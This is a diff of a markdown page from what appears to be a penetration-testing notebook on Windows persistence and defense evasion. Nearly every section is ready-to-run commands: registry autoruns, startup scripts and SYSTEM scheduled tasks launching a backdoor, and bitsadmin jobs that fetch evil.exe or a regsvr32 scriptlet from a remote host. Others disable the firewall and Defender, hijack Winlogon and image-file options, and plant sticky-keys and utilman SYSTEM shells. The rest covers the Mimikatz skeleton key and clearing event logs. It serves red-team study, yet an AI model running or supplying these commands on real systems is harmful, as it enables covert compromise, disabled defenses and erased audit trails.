@@ -10,16 +10,16 @@ description: >-
 {% hint style="success" %}
 Hack Responsibly.
 
-Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here. &#x20;
+Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
 {% endhint %}
 
 ## Tools
 
-* [SharPersist - C# Binary - persistence toolkit - @h4wkst3r](https://github.com/fireeye/SharPersist)
+* [SharPersist - C\# Binary - persistence toolkit - @h4wkst3r](https://github.com/fireeye/SharPersist)
   * Has numerous modules built-in to automate many different persistence methods
   * TODO: add tab to each applicable method below
 * [on-load/on-close persistence PowerShell module](https://gist.github.com/netbiosX/ee35fcd3722e401a38136cff7b751d79) - [@netbiosX](https://github.com/netbiosX)
-  * Powershell module which writes registry keys that execute a backdoor payload of your choice when a certain Windows binary loads or closes (in this case notepad.exe).
+  * Powershell module which writes registry keys that execute a backdoor payload of your choice when a certain Windows binary loads or closes \(in this case notepad.exe\).
 
 ## As a Low-Privilege User:
 
@@ -27,29 +27,29 @@ Always ensure you have **explicit** permission to access any computer system **b
 
 {% tabs %}
 {% tab title="PowerShell" %}
-Set a file as **Hidden**.  This can also be used to change other file property flags such as **Archive** and **ReadOnly**
+Set a file as **Hidden**.  This can also be used to change other file property flags such as **Archive** and **ReadOnly**.
 
-```powershell
-$file = (Get-ChildItem $file_to_change) #can shorten command with gci or ls
+```text
+$file = (Get-ChildItem <file>) #can shorten command with gci or ls
 $file.attributes #Show the files attributes
-#Normal
+Normal
 
 #Flip the bit of the Hidden attribute
 $file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
 $file.attributes
-#Hidden
+Hidden
 
 #To remove the 'Hidden' attribute
 $file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
 $file.attributes
-#Normal
+Normal
 ```
 {% endtab %}
 
 {% tab title="cmd.exe" %}
-Set a file as **Hidden** (`-h`).  This can also be used to change other file property flags such as (`a`) Archive and (`r`) ReadOnly. Flags must be added separately (`-h -a -r` not `-har`).
+Set a file as **Hidden** \(`-h`\).  This can also be used to change other file property flags such as \(`a`\) Archive and \(`r`\) ReadOnly. Flags must be added separately \(`-h -a -r` not `-har`\).
 
-```
+```text
 attrib <C:\path\filename> #show the file attributes
 
 attrib +h <C:\path\filename>
@@ -60,44 +60,26 @@ attrib -h <C:\path\filename>
 {% endtab %}
 {% endtabs %}
 
-### Registry - HKCU&#x20;
+### Registry - HKCU 
 
 #### Autoruns
 
-The following registry keys can be used to create persistence by auto-running your backdoor.  Keys in HKCU do not require elevation to modify.
-
-```
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]
-[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
-[HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]
-```
-
 {% tabs %}
 {% tab title="PowerShell" %}
-Create key values in the Autoruns keys in `HKCU:\Software\Microsoft\Windows\CurrentVersion`.&#x20;
+Create key values in the Autoruns keys in `HKCU:\Software\Microsoft\Windows\CurrentVersion`. **Run** and **RunOnce** keys are run each time a new user logs in. **RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.
 
-**Run** and **RunOnce** keys are run each time a new user logs in.&#x20;
-
-**RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.
-
-```powershell
-New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name $key_name -Value "$backdoor_path"
-New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce -PropertyType String -Name $key_name -Value "$backdoor_path"
-New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices -PropertyType String -Name $key_name -Value "$backdoor_path"
-New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce -PropertyType String -Name $key_name -Value "$backdoor_path"
+```text
+New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
+New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
+New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
+New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
 ```
 {% endtab %}
 
 {% tab title="cmd.exe" %}
-Create values in the Autoruns keys in `HKCU\Software\Microsoft\Windows\CurrentVersion`. The option `/v` is the name you want, and `/d` is the path to your backdoor. &#x20;
+Create values in the Autoruns keys in `HKCU\Software\Microsoft\Windows\CurrentVersion`. The option `/v` is the name you want, and `/d` is the path to your backdoor.  **Run** and **RunOnce** keys are run each time a new user logs in. **RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.
 
-**Run** and **RunOnce** keys are run each time a new user logs in.&#x20;
-
-**RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.
-
-```
+```text
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
 reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
@@ -106,33 +88,29 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
 {% endtab %}
 {% endtabs %}
 
-{% hint style="info" %}
-By default, the value of a RunOnce key is deleted before the command line is run. You can prefix a RunOnce value name with an exclamation point (!) to defer deletion of the value until after the command runs. Without the exclamation point prefix, if the RunOnce operation fails the associated program will not be asked to run the next time you start the computer.&#x20;
+> By default, the value of a RunOnce key is deleted before the command line is run. You can prefix a RunOnce value name with an exclamation point \(!\) to defer deletion of the value until after the command runs. Without the exclamation point prefix, if the RunOnce operation fails the associated program will not be asked to run the next time you start the computer. 
+>
+> By default, these keys are ignored when the computer is started in Safe Mode. The value name of RunOnce keys can be prefixed with an asterisk \(\*\) to force the program to run even in Safe mode.
+>
+> [Microsoft](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
 
-By default, these keys are ignored when the computer is started in Safe Mode. The value name of RunOnce keys can be prefixed with an asterisk (\*) to force the program to run even in Safe mode.
-
-[Microsoft](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
-{% endhint %}
-
-### Startup Folder
+### Startup
 
 Create a batch script in the user startup folder to run when the user logs in.
 
 {% tabs %}
 {% tab title="PowerShell" %}
-Create start.ps1 in `"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"`.  Then have this PowerShell script call your backdoor in `$env:USERPROFILE\AppData\Local\Temp\`.
+Create .bat in `"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"`.  Then have this batch file call your backdoor in `$env:USERPROFILE\AppData\Local\Temp\`.
 
-```powershell
-#start.ps1
-Start-Process -FilePath $env:USERPROFILE\AppData\Local\Temp\backdoor.ps1
+```text
+start /b %USERPROFILE%\AppData\Local\Temp\backdoor.bat
 ```
 {% endtab %}
 
 {% tab title="cmd.exe" %}
 Create .bat in `"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"`.  Then have this batch file call your backdoor in `%USERPROFILE%\AppData\Local\Temp\`.
 
-```
-#start.bat
+```text
 start /b $env:USERPROFILE\AppData\Local\Temp\backdoor.bat
 ```
 {% endtab %}
@@ -142,67 +120,40 @@ start /b $env:USERPROFILE\AppData\Local\Temp\backdoor.bat
 
 {% tabs %}
 {% tab title="PowerShell" %}
-These commands will allow your backdoor to be run when the specified user logs into the machine. &#x20;
+These commands will allow your backdoor to be run when the specified user logs into the machine.  
 
-```powershell
-$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $backdoor_path"
-$trigger = New-ScheduledTaskTrigger -AtLogOn -User "$username"
-$principal = New-ScheduledTaskPrincipal "$username"
+```text
+$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c <C:\Path\To\backdoor.exe>"
+$trigger = New-ScheduledTaskTrigger -AtLogOn -User "<username>"
+$principal = New-ScheduledTaskPrincipal "<username>"
 $settings = New-ScheduledTaskSettingsSet
 $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
-Register-ScheduledTask $taskname -InputObject $task
+Register-ScheduledTask <taskname> -InputObject $task
 ```
 {% endtab %}
 
 {% tab title="cmd.exe" %}
-This command will allow your backdoor to be run at a specified time.&#x20;
+This command will allow your backdoor to be run at a specified time. 
 
-```
+```text
 C:\Windows\system32\schtasks.exe"  /Create /F /RU System /SC DAILY /ST 10:39 /TN Updater /TR "C:\backdoor.exe"
 ```
 
-* `/Create` – creates a new task&#x20;
-* `/F` - forcefully creates the task and suppresses warnings if the task exists&#x20;
-* `/RU` - Specifies the user context under which the task runs - System&#x20;
-* `/SC` – Frequency of schedule – Daily&#x20;
-* `/ST` – Time the task starts – 10:51&#x20;
-* `/TN` – Name of the task – Updater&#x20;
+* `/Create` – creates a new task 
+* `/F` - forcefully creates the task and suppresses warnings if the task exists 
+* `/RU` - Specifies the user context under which the task runs - System 
+* `/SC` – Frequency of schedule – Daily 
+* `/ST` – Time the task starts – 10:51 
+* `/TN` – Name of the task – Updater 
 * `/TR` – Path and filename of the executable to run - C:\backdoor.exe
 {% endtab %}
 {% endtabs %}
 
 ### BITS Jobs
 
-{% tabs %}
-{% tab title="PowerShell" %}
-First, you must import the BitsTransfer PowerShell Module with `Import-Module BitsTransfer`.  After you import the BitsTransfer module, the following cmdlets are available:
+add powershell version
 
-* **`Add-BitsFile`** Adds files to a BITS transfer
-* **`Complete-BitsTransfer`** Completes a BITS transfer
-* **`Get-BitsTransfer`** Gets a BITS transfer
-* **`Remove-BitsTransfer`** Stops a BITS transfer
-* **`Resume-BitsTransfer`** Resumes a suspended BITS transfer
-* **`Set-BitsTransfer`** Configures a BITS transfer job
-* **`Start-BitsTransfer`** Creates and starts a BITS transfer job
-* **`Suspend-BitsTransfer`** Pauses a BITS transfer job
-
-For example, the following Windows PowerShell command begins a BITS transfer from the local computer to a computer named CLIENT:
-
-```powershell
-Start-BitsTransfer -Source file.txt -Destination \\client\share -Priority normal
-```
-
-When running Windows PowerShell interactively, the PowerShell window displays the progress of the transfer. The following command uses an abbreviated notation to download a file from a Web site to the local computer:
-
-```powershell
-Start-BitsTransfer https://server/dir/myfile.txt C:\docs\myfile.txt
-```
-
-****[**Microsoft**](https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ff382721\(v=msdn.10\))****
-{% endtab %}
-
-{% tab title="cmd.exe" %}
-```
+```text
 bitsadmin /create backdoor
 bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"
 
@@ -215,8 +166,6 @@ bitsadmin /resume backdoor
 bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
 bitsadmin /resume backdoor
 ```
-{% endtab %}
-{% endtabs %}
 
 ### Windows Services
 
@@ -224,7 +173,7 @@ May need some privileges for Windows services...
 
 ## As an Elevated-Privilege User
 
-All commands below this header require some sort of elevated account privileges.  As I discover them, I will add which specific Windows privileges are required. &#x20;
+All commands below this header require some sort of elevated account privileges.  As I discover them, I will add which specific Windows privileges are required.  
 
 ### Windows Firewall
 
@@ -232,25 +181,25 @@ All commands below this header require some sort of elevated account privileges.
 
 {% tabs %}
 {% tab title="PowerShell" %}
-To view the state and settings of all Windows firewall profiles (this output is not as pretty as the `netsh` command from cmd.exe, but can be manipulated like any PowerShell object):
+To view the state and settings of all Windows firewall profiles \(this output is not as pretty as the `netsh` command from cmd.exe, but can be manipulated like any PowerShell object\):
 
-```powershell
+```text
 Get-NetFirewallProfile
 ```
 
 To disable the Windows firewall for all network profiles:
 
-```powershell
+```text
 Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
 ```
 
-&#x20;If you only want to disable the firewall for a specific profile, you can remove the profile name (Domain, Public, or Private) from the command.  This can be useful if you are unable to fully disable the firewall.
+ If you only want to disable the firewall for a specific profile, you can remove the profile name \(Domain, Public, or Private\) from the command.  This can be useful if you are unable to fully disable the firewall.
 {% endtab %}
 
 {% tab title="cmd.exe" %}
 To view the states of all firewall profiles, and then disable all of them:
 
-```
+```text
 Netsh Advfirewall show allprofiles
 
 NetSh Advfirewall set allprofiles state off
@@ -258,7 +207,7 @@ NetSh Advfirewall set allprofiles state off
 
 If you cannot turn off all profiles, try each individual profile:
 
-```
+```text
 netsh advfirewall set currentprofile state off
 
 netsh advfirewall set domainprofile state off
@@ -276,10 +225,10 @@ These commands can also be used in PowerShell.
 
 {% tabs %}
 {% tab title="PowerShell" %}
-TODO: add more
+add more
 
-```powershell
-New-NetFirewallRule -Name $rule_name -DisplayName $rule_name -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress $attackers_IP
+```text
+New-NetFirewallRule -Name <rule_name> -DisplayName <rule_name> -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress <attackers_IP>
 ```
 {% endtab %}
 
@@ -292,9 +241,9 @@ add more
 
 {% tabs %}
 {% tab title="PowerShell" %}
-TODO: add more info
+add more info
 
-```powershell
+```text
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 {% endtab %}
@@ -302,47 +251,33 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 {% tab title="cmd.exe" %}
 add more info
 
-```
+```text
 sc config WinDefend start= disabled
 sc stop WinDefend
 ```
 {% endtab %}
 {% endtabs %}
 
-### Registry - HKLM&#x20;
+### Registry - HKLM 
 
 #### Autoruns
 
-The following keys can be used for persistence in addition to the low-privileged ones above.  Keys in HKLM require elevation to modify.
-
-```
-[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
-[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
-[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]
-[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
-[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon]
-```
-
 {% tabs %}
 {% tab title="PowerShell" %}
-Create key values in the Autoruns keys in `HKCU:\Software\Microsoft\Windows\CurrentVersion`.&#x20;
+Create key values in the Autoruns keys in `HKCU:\Software\Microsoft\Windows\CurrentVersion`. **Run** and **RunOnce** keys are run each time a new user logs in. **RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.
 
-**Run** and **RunOnce** keys are run each time a new user logs in.&#x20;
-
-**RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.
-
-```powershell
-New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name $key_name -Value "$backdoor_path"
-New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -PropertyType String -Name $key_name -Value "$backdoor_path"
-New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices -PropertyType String -Name $key_name -Value "$backdoor_path"
-New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce -PropertyType String -Name $key_name -Value "$backdoor_path"
+```text
+New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
+New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
+New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
+New-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce -PropertyType String -Name <key_name> -Value "<C:\Path\to\backdoor.exe>"
 ```
 {% endtab %}
 
 {% tab title="cmd.exe" %}
 Create values in the Autoruns keys in `HKCU\Software\Microsoft\Windows\CurrentVersion`. The option `/v` is the name you want, and `/d` is the path to your backdoor.  **Run** and **RunOnce** keys are run each time a new user logs in. **RunServices** and **RunServicesOnce** are run in the background when the logon dialog box first appears or at this stage of the boot process if there is no logon.
 
-```
+```text
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
 reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v <name> /t REG_SZ /d "<C:\Path\to\backdoor.exe>"
@@ -351,13 +286,11 @@ reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunService
 {% endtab %}
 {% endtabs %}
 
-{% hint style="info" %}
-By default, the value of a RunOnce key is deleted before the command line is run. You can prefix a RunOnce value name with an exclamation point (!) to defer deletion of the value until after the command runs. Without the exclamation point prefix, if the RunOnce operation fails the associated program will not be asked to run the next time you start the computer.&#x20;
-
-By default, these keys are ignored when the computer is started in Safe Mode. The value name of RunOnce keys can be prefixed with an asterisk (\*) to force the program to run even in Safe mode.
-
-[Microsoft](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
-{% endhint %}
+> By default, the value of a RunOnce key is deleted before the command line is run. You can prefix a RunOnce value name with an exclamation point \(!\) to defer deletion of the value until after the command runs. Without the exclamation point prefix, if the RunOnce operation fails the associated program will not be asked to run the next time you start the computer. 
+>
+> By default, these keys are ignored when the computer is started in Safe Mode. The value name of RunOnce keys can be prefixed with an asterisk \(\*\) to force the program to run even in Safe mode.
+>
+> [Microsoft](https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
 
 #### Winlogon Helper DLL
 
@@ -365,16 +298,16 @@ By default, these keys are ignored when the computer is started in Safe Mode. Th
 {% tab title="PowerShell" %}
 Run backdoor during Windows logon
 
-```powershell
-Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, $backdoor" -Force
-Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, $backdoor" -Force
+```text
+Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, <backdoor.exe>" -Force
+Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, <backdoor.exe>" -Force
 ```
 {% endtab %}
 
 {% tab title="cmd.exe" %}
 Run backdoor during Windows logon
 
-```
+```text
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, evilbinary.exe" /f
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, evilbinary.exe" /f
 ```
@@ -387,7 +320,7 @@ add powershell
 
 Add the following three keys to the registry to allow your backdoor to execute whenever Notepad.exe closes.
 
-```
+```text
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
@@ -397,12 +330,12 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\not
 
 You can also abuse this to run your backdoor whenever Notepad.exe is opened with two registry keys:
 
-```
+```text
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "pentestlab.exe"
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
+reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe
 ```
 
-This process can be automated by using [this](https://gist.github.com/netbiosX/ee35fcd3722e401a38136cff7b751d79) PowerShell module from [netbiosX](https://github.com/netbiosX). &#x20;
+This process can be automated by using [this](https://gist.github.com/netbiosX/ee35fcd3722e401a38136cff7b751d79) PowerShell module from [netbiosX](https://github.com/netbiosX).  
 
 ### Scheduled Tasks
 
@@ -410,13 +343,13 @@ Scheduled Task to run your backdoor as NT AUTHORITY\SYSTEM, everyday at 9am.
 
 add cmd.exe
 
-```powershell
-$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $backdoor_path"
-$trigger = New-ScheduledTaskTrigger -Daily -At 9am
-$principal = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
-$settings = New-ScheduledTaskSettingsSet
-$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $Settings
-Register-ScheduledTask $taskname -InputObject $task
+```text
+PS C:\> $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c <C:\Path\To\backdoor.exe>"
+PS C:\> $trigger = New-ScheduledTaskTrigger -Daily -At 9am
+PS C:\> $principal = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest
+PS C:\> $settings = New-ScheduledTaskSettingsSet
+PS C:\> $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $Settings
+PS C:\> Register-ScheduledTask <taskname> -InputObject $task
 ```
 
 ### Windows Services
@@ -425,37 +358,37 @@ Register-ScheduledTask $taskname -InputObject $task
 {% tab title="PowerShell" %}
 Create a service that can start automatically or on-demand as needed.
 
-```powershell
-New-Service -Name "AppReadiness" -BinaryPathName "$backdoor_path" -Description "Gets apps ready for use the first time a user signs in to this PC and when adding new apps."
+```text
+PS C:\> New-Service -Name "AppReadiness" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -Description "Gets apps ready for use the first time a user signs in to this PC and when adding new apps."
 ```
 {% endtab %}
 
 {% tab title="cmd.exe" %}
-TODO: add more
+
 {% endtab %}
 {% endtabs %}
 
 ### Replacing Windows Binaries
 
-Replace these binaries with your backdoor to enable easy persistence with minimal interference with normal users.  However, beware using these on systems where the user needs these accessibility tools!
+Replace these binaries with your backdoor to enable easy persistence with minimal interference with normal user's notice.  Beware using these on systems where the user needs these accessibility tools!
 
 {% tabs %}
 {% tab title="Windows XP+" %}
-| Feature            | Executable                            |
-| ------------------ | ------------------------------------- |
-| Sticky Keys        | C:\Windows\System32\sethc.exe         |
-| Accessibility Menu | C:\Windows\System32\utilman.exe       |
-| On-Screen Keyboard | C:\Windows\System32\osk.exe           |
-| Magnifier          | C:\Windows\System32\Magnify.exe       |
-| Narrator           | C:\Windows\System32\Narrator.exe      |
-| Display Switcher   | C:\Windows\System32\DisplaySwitch.exe |
-| App Switcher       | C:\Windows\System32\AtBroker.exe      |
+| Feature | Executable |
+| :--- | :--- |
+| Sticky Keys | C:\Windows\System32\sethc.exe |
+| Accessibility Menu | C:\Windows\System32\utilman.exe |
+| On-Screen Keyboard | C:\Windows\System32\osk.exe |
+| Magnifier | C:\Windows\System32\Magnify.exe |
+| Narrator | C:\Windows\System32\Narrator.exe |
+| Display Switcher | C:\Windows\System32\DisplaySwitch.exe |
+| App Switcher | C:\Windows\System32\AtBroker.exe |
 
 In Metasploit : `use post/windows/manage/sticky_keys`
 {% endtab %}
 
 {% tab title="Windows 10+" %}
-In addition to the older backdoor-able Windows binaries, in Windows 10 you can exploit a DLL hijacking vulnerability in the On-Screen Keyboard executable '**osk.exe'** by creating a malicious **HID.dll** in `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.
+You can exploit a DLL hijacking vulnerability in the On-Screen Keyboard **osk.exe** executable by creating a malicious **HID.dll** in `C:\Program Files\Common Files\microsoft shared\ink\HID.dll`.
 {% endtab %}
 {% endtabs %}
 
@@ -463,26 +396,26 @@ In addition to the older backdoor-able Windows binaries, in Windows 10 you can e
 
 Remove the `-ComputerName $computername` property to run on the local machine.
 
-```powershell
-$RDPstate = Get-CimInstance -Class Win32_TerminalServiceSetting -Namespace Root\CimV2\TerminalServices -ComputerName $computername
+```text
+$RDPstate = Get-WmiObject -Class Win32_TerminalServiceSetting -Namespace Root\CimV2\TerminalServices -ComputerName $computername
 $RDPstate.SetAllowTSConnections(1,1)
 ```
 
 #### Disable RDP on a remote host:
 
-```powershell
-$RDPstate = Get-CimInstance -Class Win32_TerminalServiceSetting -Namespace Root\CimV2\TerminalServices -ComputerName $computername
+```text
+$RDPstate = Get-WmiObject -Class Win32_TerminalServiceSetting -Namespace Root\CimV2\TerminalServices -ComputerName $computername
 $RDPstate.SetAllowTSConnections(0,0)
 ```
 
 #### Check RDP status:
 
-```powershell
-$RDPstate = Get-CimInstance -Class Win32_TerminalServiceSetting -Namespace Root\CimV2\TerminalServices -ComputerName $ComputerName
+```text
+$RDPstate = Get-WmiObject -Class Win32_TerminalServiceSetting -Namespace Root\CimV2\TerminalServices -ComputerName $ComputerName
 $RDPstate.AllowTSConnections
 ```
 
-The first argument represents AllowTSConnections(0 – disable, 1 – enable) and the second one represents ModifyFirewallException (0 – don’t modify firewall rules, 1 – modify firewall rules). You can read more about it at [https://docs.microsoft.com/en-us/windows/win32/termserv/win32-terminalservicesetting-setallowtsconnections](https://docs.microsoft.com/en-us/windows/win32/termserv/win32-terminalservicesetting-setallowtsconnections)
+The first argument represents AllowTSConnections\(0 – disable, 1 – enable\) and the second one represents ModifyFirewallException \(0 – don’t modify firewall rules, 1 – modify firewall rules\). You can read more about it at [https://docs.microsoft.com/en-us/windows/win32/termserv/win32-terminalservicesetting-setallowtsconnections](https://docs.microsoft.com/en-us/windows/win32/termserv/win32-terminalservicesetting-setallowtsconnections)
 
 ### RDP Backdoors
 
@@ -490,7 +423,7 @@ The first argument represents AllowTSConnections(0 – disable, 1 – enable) an
 
 After adding this registry key, RDP or physically log into the machine. At the login screen, press `Win+U` to get a cmd.exe prompt as NT AUTHORITY\SYSTEM.
 
-```
+```text
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
 
@@ -498,7 +431,7 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 
 After adding this registry key, RDP or physically log into the machine. At the login screen, repeatedly press F5 when you are at the login screen to get a cmd.exe prompt as NT AUTHORITY\SYSTEM.
 
-```
+```text
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
 ```
 
@@ -506,12 +439,12 @@ REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution 
 
 Mimikatz gives you the opportunity to backdoor an entire domain at once by using the skeleton key module.  This must be run by a user with Domain Admin credentials to work properly.
 
-```powershell
+```text
 # Exploitation Command (run as Domain Admin):
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName $FQDN_of_DC
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <FQDN_of_DC>
 
 # Login using the password "mimikatz"
-Enter-PSSession -ComputerName $ComputerName -Credential $Domain\$UserName
+Enter-PSSession -ComputerName <Any_Domain_Computer> -Credential <Domain>\Administrator
 ```
 
 ### Clear Windows Event Logs
@@ -520,7 +453,7 @@ Generates Windows event 1102 when you clear logs!
 
 [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil)
 
-```
+```text
 @echo off
 
 FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
@@ -551,29 +484,27 @@ Exit
 
 The `Clear-EventLog` cmdlet deletes all of the entries from the specified event logs on the local computer or on remote computers. To use `Clear-EventLog`, you must be a member of the Administrators group on the affected computer.
 
-```powershell
+```text
 Get-EventLog -List
 
-<#
 Max(K)   Retain   OverflowAction      Entries  Log
 ------   ------   --------------      -------  ---
 15,168        0   OverwriteAsNeeded   20,792   Application
 15,168        0   OverwriteAsNeeded   12,559   System
 15,360        0   OverwriteAsNeeded   11,173   Windows PowerShell
-#>
 ```
 
-&#x20;`-List` Displays the list of event logs on the computer.
+ `-List` Displays the list of event logs on the computer.
 
 #### To list logs on other systems
 
-```powershell
+```text
